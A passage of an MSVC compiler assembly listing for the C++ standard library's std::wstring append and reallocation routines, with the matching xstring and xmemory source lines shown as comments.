  00062	4c 89 44 24 20	 mov	 QWORD PTR [rsp+32], r8
  00067	49 8b d0	 mov	 rdx, r8
  0006a	48 8b cb	 mov	 rcx, rbx
  0006d	e8 00 00 00 00	 call	 ??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>,wchar_t const *,unsigned __int64>

; 3317 :             _Count,
; 3318 :             [](_Elem* const _New_ptr, const _Elem* const _Old_ptr, const size_type _Old_size, const _Elem* const _Ptr,
; 3319 :                 const size_type _Count) {
; 3320 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);
; 3321 :                 _Traits::copy(_New_ptr + _Old_size, _Ptr, _Count);
; 3322 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());
; 3323 :             },
; 3324 :             _Ptr, _Count);
; 3325 :     }

  00072	48 83 c4 30	 add	 rsp, 48			; 00000030H
  00076	5b		 pop	 rbx
  00077	c3		 ret	 0
?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??R<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W0101@Z
_TEXT	SEGMENT
this$dead$ = 48
_New_ptr$ = 56
_Old_ptr$ = 64
_Old_size$ = 72
_Ptr$ = 80
_Count$ = 88
??R<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W0101@Z PROC ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>::operator(), COMDAT

; 3319 :                 const size_type _Count) {

$LN8:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 74 24 10	 mov	 QWORD PTR [rsp+16], rsi
  0000a	48 89 7c 24 18	 mov	 QWORD PTR [rsp+24], rdi
  0000f	41 56		 push	 r14
  00011	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  00015	49 8b c0	 mov	 rax, r8

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00018	4b 8d 3c 09	 lea	 rdi, QWORD PTR [r9+r9]

; 3319 :                 const size_type _Count) {

  0001c	4c 8b f2	 mov	 r14, rdx

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  0001f	4c 8b c7	 mov	 r8, rdi
  00022	48 8b d0	 mov	 rdx, rax
  00025	49 8b ce	 mov	 rcx, r14

; 3319 :                 const size_type _Count) {

  00028	49 8b f1	 mov	 rsi, r9

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  0002b	e8 00 00 00 00	 call	 memcpy
  00030	48 8b 5c 24 58	 mov	 rbx, QWORD PTR _Count$[rsp]

; 3320 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);
; 3321 :                 _Traits::copy(_New_ptr + _Old_size, _Ptr, _Count);

  00035	4a 8d 0c 37	 lea	 rcx, QWORD PTR [rdi+r14]

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00039	48 8b 54 24 50	 mov	 rdx, QWORD PTR _Ptr$[rsp]
  0003e	4c 8d 04 1b	 lea	 r8, QWORD PTR [rbx+rbx]
  00042	e8 00 00 00 00	 call	 memcpy

; 3322 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());
; 3323 :             },

  00047	48 8b 7c 24 40	 mov	 rdi, QWORD PTR [rsp+64]
  0004c	48 8d 04 1e	 lea	 rax, QWORD PTR [rsi+rbx]
  00050	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  00055	33 c9		 xor	 ecx, ecx
  00057	48 8b 74 24 38	 mov	 rsi, QWORD PTR [rsp+56]
  0005c	66 41 89 0c 46	 mov	 WORD PTR [r14+rax*2], cx
  00061	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00065	41 5e		 pop	 r14
  00067	c3		 ret	 0
??R<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W0101@Z ENDP ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$move@AEAV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YA$$QEAV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEAV10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$move@AEAV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YA$$QEAV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEAV10@@Z PROC ; std::move<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > &>, COMDAT

; 1572 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

  00000	48 8b c1	 mov	 rax, rcx

; 1573 : }

  00003	c3		 ret	 0
??$move@AEAV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YA$$QEAV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEAV10@@Z ENDP ; std::move<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$forward@V?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@V?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z PROC ; std::forward<std::allocator<wchar_t> >, COMDAT

; 1561 :     return static_cast<_Ty&&>(_Arg);

  00000	48 8b c1	 mov	 rax, rcx

; 1562 : }

  00003	c3		 ret	 0
??$forward@V?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z ENDP ; std::forward<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$forward@AEAPEA_W@std@@YAAEAPEA_WAEAPEA_W@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEAPEA_W@std@@YAAEAPEA_WAEAPEA_W@Z PROC	; std::forward<wchar_t * &>, COMDAT

; 1561 :     return static_cast<_Ty&&>(_Arg);

  00000	48 8b c1	 mov	 rax, rcx

; 1562 : }

  00003	c3		 ret	 0
??$forward@AEAPEA_W@std@@YAAEAPEA_WAEAPEA_W@Z ENDP	; std::forward<wchar_t * &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z
_TEXT	SEGMENT
this$ = 96
_Size_increase$ = 104
_Fn$dead$ = 112
<_Args_0>$ = 120
<_Args_1>$ = 128
??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>,wchar_t const *,unsigned __int64>, COMDAT

; 4807 :     _CONSTEXPR20 basic_string& _Reallocate_grow_by(const size_type _Size_increase, _Fty _Fn, _ArgTys... _Args) {

$LN99:
  00000	40 56		 push	 rsi
  00002	57		 push	 rdi
  00003	41 55		 push	 r13
  00005	41 56		 push	 r14
  00007	48 83 ec 38	 sub	 rsp, 56			; 00000038H

; 4808 :         // reallocate to increase size by _Size_increase elements, new buffer prepared by
; 4809 :         // _Fn(_New_ptr, _Old_ptr, _Old_size, _Args...)
; 4810 :         auto& _My_data            = _Mypair._Myval2;
; 4811 :         const size_type _Old_size = _My_data._Mysize;

  0000b	4c 8b 71 10	 mov	 r14, QWORD PTR [rcx+16]

; 4812 :         if (max_size() - _Old_size < _Size_increase) {

  0000f	48 bf fe ff ff
	ff ff ff ff 7f	 mov	 rdi, 9223372036854775806 ; 7ffffffffffffffeH
  00019	48 8b c7	 mov	 rax, rdi
  0001c	4d 8b e9	 mov	 r13, r9
  0001f	49 2b c6	 sub	 rax, r14
  00022	48 8b f1	 mov	 rsi, rcx
  00025	48 3b c2	 cmp	 rax, rdx
  00028	0f 82 90 01 00
	00		 jb	 $LN98@Reallocate
  0002e	48 89 5c 24 70	 mov	 QWORD PTR [rsp+112], rbx

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  00033	45 33 c0	 xor	 r8d, r8d
  00036	48 89 6c 24 30	 mov	 QWORD PTR [rsp+48], rbp

; 4814 :         }
; 4815 : 
; 4816 :         const size_type _New_size     = _Old_size + _Size_increase;
; 4817 :         const size_type _Old_capacity = _My_data._Myres;

  0003b	48 8b 69 18	 mov	 rbp, QWORD PTR [rcx+24]
  0003f	4c 89 64 24 28	 mov	 QWORD PTR [rsp+40], r12
  00044	4c 89 7c 24 20	 mov	 QWORD PTR [rsp+32], r15
  00049	4e 8d 3c 32	 lea	 r15, QWORD PTR [rdx+r14]

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  0004d	49 8b d7	 mov	 rdx, r15
  00050	48 83 ca 07	 or	 rdx, 7
  00054	48 3b d7	 cmp	 rdx, rdi

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  00057	76 10		 jbe	 SHORT $LN9@Reallocate

; 4763 :             return _Max;

  00059	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  00063	48 8d 0c 00	 lea	 rcx, QWORD PTR [rax+rax]
  00067	eb 52		 jmp	 SHORT $LN79@Reallocate
$LN9@Reallocate:

; 4764 :         }
; 4765 : 
; 4766 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows

  00069	48 8b cd	 mov	 rcx, rbp
  0006c	48 8b c7	 mov	 rax, rdi
  0006f	48 d1 e9	 shr	 rcx, 1
  00072	48 2b c1	 sub	 rax, rcx
  00075	48 3b e8	 cmp	 rbp, rax
  00078	76 10		 jbe	 SHORT $LN10@Reallocate

; 4767 :             return _Max;

  0007a	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  00084	48 8d 0c 00	 lea	 rcx, QWORD PTR [rax+rax]
  00088	eb 31		 jmp	 SHORT $LN79@Reallocate
$LN10@Reallocate:

; 4768 :         }
; 4769 : 
; 4770 :         return (_STD max)(_Masked, _Old + _Old / 2);

  0008a	48 8d 04 29	 lea	 rax, QWORD PTR [rcx+rbp]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility

; 77   :     return _Left < _Right ? _Right : _Left;

  0008e	48 8b fa	 mov	 rdi, rdx
  00091	48 3b d0	 cmp	 rdx, rax
  00094	48 0f 42 f8	 cmovb	 rdi, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  00098	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2613 :         ++_Capacity; // Take null terminator into consideration

  000a2	48 8d 4f 01	 lea	 rcx, QWORD PTR [rdi+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  000a6	48 3b c8	 cmp	 rcx, rax
  000a9	0f 87 09 01 00
	00		 ja	 $LN80@Reallocate

; 74   :             _Throw_bad_array_new_length(); // multiply overflow
; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  000af	48 03 c9	 add	 rcx, rcx

; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  000b2	48 81 f9 00 10
	00 00		 cmp	 rcx, 4096		; 00001000H
  000b9	72 2c		 jb	 SHORT $LN25@Reallocate
$LN79@Reallocate:

; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  000bb	48 8d 41 27	 lea	 rax, QWORD PTR [rcx+39]

; 143  :     if (_Block_size <= _Bytes) {

  000bf	48 3b c1	 cmp	 rax, rcx
  000c2	0f 86 f0 00 00
	00		 jbe	 $LN80@Reallocate

; 90   :         return ::operator new(_Bytes);

  000c8	48 8b c8	 mov	 rcx, rax
  000cb	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  000d0	48 85 c0	 test	 rax, rax
  000d3	0f 84 eb 00 00
	00		 je	 $LN66@Reallocate

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  000d9	48 8d 58 27	 lea	 rbx, QWORD PTR [rax+39]
  000dd	48 83 e3 e0	 and	 rbx, -32		; ffffffffffffffe0H

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  000e1	48 89 43 f8	 mov	 QWORD PTR [rbx-8], rax

; 242  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

  000e5	eb 12		 jmp	 SHORT $LN24@Reallocate
$LN25@Reallocate:

; 243  :         }
; 244  :     }
; 245  : #endif // defined(_M_IX86) || defined(_M_X64)
; 246  : 
; 247  :     if (_Bytes != 0) {

  000e7	48 85 c9	 test	 rcx, rcx
  000ea	74 0a		 je	 SHORT $LN26@Reallocate

; 90   :         return ::operator new(_Bytes);

  000ec	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  000f1	48 8b d8	 mov	 rbx, rax

; 248  :         return _Traits::_Allocate(_Bytes);

  000f4	eb 03		 jmp	 SHORT $LN24@Reallocate
$LN26@Reallocate:

; 249  :     }
; 250  : 
; 251  :     return nullptr;

  000f6	49 8b d8	 mov	 rbx, r8
$LN24@Reallocate:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4826 :         _Elem* const _Raw_new = _Unfancy(_New_ptr);

  000f9	48 8b 84 24 80
	00 00 00	 mov	 rax, QWORD PTR <_Args_1>$[rsp]
  00101	4f 8d 04 36	 lea	 r8, QWORD PTR [r14+r14]
  00105	4c 89 7e 10	 mov	 QWORD PTR [rsi+16], r15
  00109	4d 8d 24 18	 lea	 r12, QWORD PTR [r8+rbx]
  0010d	48 89 7e 18	 mov	 QWORD PTR [rsi+24], rdi

; 4827 :         if (_Old_capacity > _Small_string_capacity) {

  00111	48 8b cb	 mov	 rcx, rbx
  00114	4c 8d 3c 00	 lea	 r15, QWORD PTR [rax+rax]
  00118	49 03 c6	 add	 rax, r14
  0011b	4c 8d 34 43	 lea	 r14, QWORD PTR [rbx+rax*2]
  0011f	48 83 fd 07	 cmp	 rbp, 7
  00123	76 52		 jbe	 SHORT $LN3@Reallocate

; 4828 :             const pointer _Old_ptr = _My_data._Bx._Ptr;

  00125	48 8b 3e	 mov	 rdi, QWORD PTR [rsi]

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00128	48 8b d7	 mov	 rdx, rdi
  0012b	e8 00 00 00 00	 call	 memcpy
  00130	4d 8b c7	 mov	 r8, r15
  00133	49 8b d5	 mov	 rdx, r13
  00136	49 8b cc	 mov	 rcx, r12
  00139	e8 00 00 00 00	 call	 memcpy

; 3322 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());

  0013e	33 c0		 xor	 eax, eax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00140	48 8d 14 6d 02
	00 00 00	 lea	 rdx, QWORD PTR [rbp*2+2]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 3322 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());

  00148	66 41 89 06	 mov	 WORD PTR [r14], ax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0014c	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00153	72 18		 jb	 SHORT $LN69@Reallocate

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00155	48 8b 4f f8	 mov	 rcx, QWORD PTR [rdi-8]
  00159	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  0015d	48 2b f9	 sub	 rdi, rcx

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00160	48 8d 47 f8	 lea	 rax, QWORD PTR [rdi-8]
  00164	48 83 f8 1f	 cmp	 rax, 31
  00168	77 5a		 ja	 SHORT $LN66@Reallocate

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  0016a	48 8b f9	 mov	 rdi, rcx
$LN69@Reallocate:

; 268  :         ::operator delete(_Ptr, _Bytes);

  0016d	48 8b cf	 mov	 rcx, rdi
  00170	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4832 :         } else {

  00175	eb 1c		 jmp	 SHORT $LN4@Reallocate
$LN3@Reallocate:

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00177	48 8b d6	 mov	 rdx, rsi
  0017a	e8 00 00 00 00	 call	 memcpy
  0017f	4d 8b c7	 mov	 r8, r15
  00182	49 8b d5	 mov	 rdx, r13
  00185	49 8b cc	 mov	 rcx, r12
  00188	e8 00 00 00 00	 call	 memcpy

; 3322 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());

  0018d	33 c0		 xor	 eax, eax
  0018f	66 41 89 06	 mov	 WORD PTR [r14], ax
$LN4@Reallocate:

; 4833 :             _Fn(_Raw_new, _My_data._Bx._Buf, _Old_size, _Args...);
; 4834 :             _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);
; 4835 :         }
; 4836 : 
; 4837 :         _ASAN_STRING_CREATE(*this);
; 4838 :         return *this;

  00193	48 89 1e	 mov	 QWORD PTR [rsi], rbx
  00196	48 8b c6	 mov	 rax, rsi
  00199	4c 8b 64 24 28	 mov	 r12, QWORD PTR [rsp+40]
  0019e	48 8b 6c 24 30	 mov	 rbp, QWORD PTR [rsp+48]
  001a3	48 8b 5c 24 70	 mov	 rbx, QWORD PTR [rsp+112]
  001a8	4c 8b 7c 24 20	 mov	 r15, QWORD PTR [rsp+32]

; 4839 :     }

  001ad	48 83 c4 38	 add	 rsp, 56			; 00000038H
  001b1	41 5e		 pop	 r14
  001b3	41 5d		 pop	 r13
  001b5	5f		 pop	 rdi
  001b6	5e		 pop	 rsi
  001b7	c3		 ret	 0
$LN80@Reallocate:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 144  :         _Throw_bad_array_new_length(); // add overflow

  001b8	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
  001bd	cc		 int	 3
$LN98@Reallocate:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4813 :             _Xlen_string(); // result too long

  001be	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
  001c3	cc		 int	 3
$LN66@Reallocate:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  001c4	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  001c9	cc		 int	 3
$LN96@Reallocate:
??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>,wchar_t const *,unsigned __int64>
_TEXT	ENDS
END
